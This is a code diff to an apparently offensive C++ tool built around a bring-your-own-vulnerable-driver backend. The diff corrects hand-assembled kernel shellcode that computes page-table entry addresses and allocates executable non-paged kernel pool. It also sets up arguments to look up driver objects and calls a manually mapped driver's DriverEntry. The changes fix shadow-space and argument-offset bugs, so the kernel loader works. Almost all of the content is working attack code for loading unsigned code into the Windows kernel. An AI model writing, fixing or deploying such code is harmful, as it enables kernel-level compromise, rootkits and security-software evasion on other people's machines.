@@ -182,7 +182,8 @@ static uint64_t ComputePteAddress(uint64_t va, uint64_t selfRefIndex) {
     if (pteBase & 0x0000800000000000ULL) {
         pteBase |= 0xFFFF000000000000ULL;
     }
-    return pteBase + ((va >> 12) << 3);
+    // PTE virtual address: base + page-index * sizeof(PTE), with canonical-address masking.
+    return pteBase + ((va >> 9) & 0x7FFFFFFFF8ULL);
 }
 
 // Try common self-referential PML4 indices used by Windows.
@@ -359,10 +360,10 @@ bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& 
     if (!backend || size == 0) return false;
 
     uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePool2");
-    uint64_t poolType = 0x20; // POOL_FLAG_NON_PAGED (Win10/11)
+    uint64_t poolType = 0x80; // POOL_FLAG_NON_PAGED_EXECUTE
     if (!allocFn) {
         allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
-        poolType = 0; // NonPagedPool
+        poolType = 0; // NonPagedPool (executable pre-Win8; NX on Win8+)
     }
     if (!allocFn) {
         std::cerr << "[hinv::kmem] ExAllocatePool2/WithTag not found\n";
@@ -398,13 +399,16 @@ bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& 
     sc.insert(sc.end(), { 0x48, 0x8B, 0x4B, 0x18 });
     // mov rdx, [rbx+0x10]   ; NumberOfBytes
     sc.insert(sc.end(), { 0x48, 0x8B, 0x53, 0x10 });
-    // mov r8d, 'hinv'       ; Tag
-    sc.insert(sc.end(), { 0x41, 0xB8 });
-    PushU64(0x68696E76ULL);
+    // mov r8d, 'hinv'       ; Tag (mov r8d, imm32)
+    sc.insert(sc.end(), { 0x41, 0xB8, 0x68, 0x69, 0x6E, 0x76 });
     // mov rax, [rbx+0x08]   ; ExAllocatePool* VA
     sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
+    // sub rsp, 0x28         ; shadow space
+    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
     // call rax
     sc.insert(sc.end(), { 0xFF, 0xD0 });
+    // add rsp, 0x28
+    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
     // mov rcx, [rbx]        ; result pointer (usermode)
     sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
     // mov [rcx], rax        ; store allocated VA
@@ -492,13 +496,17 @@ uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverNam
     Emit({ 0x48, 0x31, 0xD2 });             // xor rdx, rdx
     Emit({ 0x4D, 0x31, 0xC0 });             // xor r8, r8
     Emit({ 0x4D, 0x31, 0xC9 });             // xor r9, r9
-    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x20] = 0
-    Emit({ 0x48, 0x8B, 0x43, 0x10 });       // mov rax, [rbx+0x10] (IoDriverObjectType)
-    Emit({ 0x48, 0x89, 0x44, 0x24, 0x28 }); // [rsp+0x28] = rax
-    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x30] = KernelMode
-    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x38] = NULL
+    // arg5 = ObjectType = *IoDriverObjectType (dereference the exported global)
+    Emit({ 0x48, 0x8B, 0x43, 0x10 });       // mov rax, [rbx+0x10]
+    Emit({ 0x48, 0x8B, 0x00 });             // mov rax, [rax]
+    Emit({ 0x48, 0x89, 0x44, 0x24, 0x20 }); // [rsp+0x20] = rax
+    // arg6 = AccessMode = KernelMode (0)
+    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00 });
+    // arg7 = ParseContext = NULL
+    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 });
+    // arg8 = Object = &objectOut
     Emit({ 0x48, 0x8D, 0x43, 0x20 });       // lea rax, [rbx+0x20]
-    Emit({ 0x48, 0x89, 0x44, 0x24, 0x40 }); // [rsp+0x40] = &objectOut
+    Emit({ 0x48, 0x89, 0x44, 0x24, 0x38 }); // [rsp+0x38] = rax
     Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08]
     Emit({ 0xFF, 0xD0 });                   // call rax
     Emit({ 0x48, 0x8B, 0x53, 0x20 });       // mov rdx, [rbx+0x20] (object pointer)
@@ -557,7 +565,11 @@ uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
     Emit({ 0x49, 0x89, 0xC2 });             // mov r10, rax
     Emit({ 0x48, 0x8B, 0x53, 0x18 });       // mov rdx, [rbx+0x18] (RegistryPath)
     Emit({ 0x48, 0x8B, 0x4B, 0x10 });       // mov rcx, [rbx+0x10] (DriverObject)
+    // sub rsp, 0x28                        ; shadow space
+    Emit({ 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
     Emit({ 0x41, 0xFF, 0xD2 });             // call r10
+    // add rsp, 0x28
+    Emit({ 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
     Emit({ 0x48, 0x8B, 0x0B });             // mov rcx, [rbx]
     Emit({ 0x89, 0x01 });                   // mov [rcx], eax
 
